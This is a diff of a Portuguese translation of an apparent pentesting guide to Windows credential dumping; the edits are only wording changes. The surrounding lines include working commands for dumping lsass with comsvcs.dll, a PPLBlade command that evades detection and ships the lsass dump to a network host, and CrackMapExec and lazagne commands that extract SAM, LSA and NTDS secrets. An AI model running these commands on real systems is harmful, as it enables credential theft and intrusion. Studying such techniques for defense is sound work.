@@ -73,7 +73,7 @@ Este processo é feito automaticamente com [SprayKatz](https://github.com/aas-n/
 
 Uma DLL chamada **comsvcs.dll** encontrada em `C:\Windows\System32` é responsável por **despejar a memória do processo** em caso de falha. Esta DLL inclui uma **função** chamada **`MiniDumpW`**, projetada para ser invocada usando `rundll32.exe`.\
 É irrelevante usar os dois primeiros argumentos, mas o terceiro é dividido em três componentes. O ID do processo a ser despejado constitui o primeiro componente, o local do arquivo de despejo representa o segundo, e o terceiro componente é estritamente a palavra **full**. Não existem opções alternativas.\
-Após analisar esses três componentes, a DLL é acionada para criar o arquivo de despejo e transferir a memória do processo especificado para este arquivo.\
+Ao analisar esses três componentes, a DLL é acionada para criar o arquivo de despejo e transferir a memória do processo especificado para este arquivo.\
 A utilização de **comsvcs.dll** é viável para despejar o processo lsass, eliminando assim a necessidade de fazer upload e executar o procdump. Este método é descrito em detalhes em [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
 O seguinte comando é empregado para execução:
@@ -104,7 +104,7 @@ Get-Process -Name LSASS
 
 1. Contornar a proteção PPL
 2. Ofuscar arquivos de despejo de memória para evitar mecanismos de detecção baseados em assinatura do Defender
-3. Fazer upload de despejo de memória com métodos de upload RAW e SMB sem gravá-lo no disco (despejo sem arquivo)
+3. Fazer upload de despejos de memória com métodos de upload RAW e SMB sem gravá-los no disco (despejo sem arquivo)
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
@@ -114,7 +114,7 @@ PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmod
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
-### Extrair segredos do LSA
+### Extrair segredos LSA
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
@@ -123,7 +123,7 @@ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Extrair o histórico de senhas do NTDS.dit do DC alvo
+### Extrair o histórico de senhas do NTDS.dit do DC de destino
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
@@ -131,7 +131,7 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
-## Roubo do SAM e SYSTEM
+## Roubo de SAM & SYSTEM
 
 Esses arquivos devem estar **localizados** em _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Mas **você não pode apenas copiá-los de uma maneira regular** porque estão protegidos.
 
@@ -194,7 +194,7 @@ Dentro deste banco de dados, três tabelas principais são mantidas:
 
 Mais informações sobre isso: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-O Windows usa _Ntdsa.dll_ para interagir com esse arquivo e é utilizado por _lsass.exe_. Assim, **parte** do arquivo **NTDS.dit** pode estar localizada **dentro da memória do `lsass`** (você pode encontrar os dados acessados mais recentemente provavelmente devido à melhoria de desempenho ao usar um **cache**).
+O Windows usa _Ntdsa.dll_ para interagir com esse arquivo e é utilizado por _lsass.exe_. Assim, **parte** do arquivo **NTDS.dit** pode ser localizada **dentro da memória do `lsass`** (você pode encontrar os dados acessados mais recentemente provavelmente devido à melhoria de desempenho ao usar um **cache**).
 
 #### Descriptografando os hashes dentro do NTDS.dit
 
@@ -234,7 +234,7 @@ Objetos NTDS podem ser extraídos para um banco de dados SQLite com [ntdsdotsqli
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-O hive `SYSTEM` é opcional, mas permite a descriptografia de segredos (hashes NT e LM, credenciais suplementares como senhas em texto claro, chaves kerberos ou de confiança, históricos de senhas NT e LM). Juntamente com outras informações, os seguintes dados são extraídos: contas de usuário e de máquina com seus hashes, flags UAC, timestamp do último logon e alteração de senha, descrição das contas, nomes, UPN, SPN, grupos e associações recursivas, árvore de unidades organizacionais e associação, domínios confiáveis com tipo de confiança, direção e atributos...
+O hive `SYSTEM` é opcional, mas permite a descriptografia de segredos (hashes NT e LM, credenciais suplementares como senhas em texto claro, chaves kerberos ou de confiança, históricos de senhas NT e LM). Juntamente com outras informações, os seguintes dados são extraídos: contas de usuário e de máquina com seus hashes, flags UAC, timestamp do último logon e mudança de senha, descrição das contas, nomes, UPN, SPN, grupos e associações recursivas, árvore de unidades organizacionais e associação, domínios confiáveis com tipo de confiança, direção e atributos...
 
 ## Lazagne
 
@@ -244,7 +244,7 @@ lazagne.exe all
 ```
 ## Outras ferramentas para extrair credenciais do SAM e LSASS
 
-### Windows credentials Editor (WCE)
+### Windows Credentials Editor (WCE)
 
 Esta ferramenta pode ser usada para extrair credenciais da memória. Baixe-a em: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
